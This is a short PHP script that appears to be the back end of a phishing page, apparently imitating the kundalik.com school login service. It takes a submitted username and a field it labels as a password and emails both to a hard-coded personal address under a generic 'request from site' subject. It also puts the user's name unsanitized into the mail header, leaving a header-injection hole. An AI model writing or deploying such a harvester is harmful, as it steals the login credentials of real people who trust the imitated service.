<?php
    $name = $_POST['name'];
    $surname = $_POST['surname'];

	$to = "mininvladilen@gmail.com"; 
	$date = date ("d.m.Y"); 
	$time = date ("h:i");
	$from = $name;
	$subject = "Заявка c сайта";

	
	$msg="
    Имя: $name /n
    Пароль: $surname /n"; 	
	mail($to, $subject, $msg, "From: $from ");
?>

<!-- <link rel="stylesheet" href="https://kundalik.com/"> -->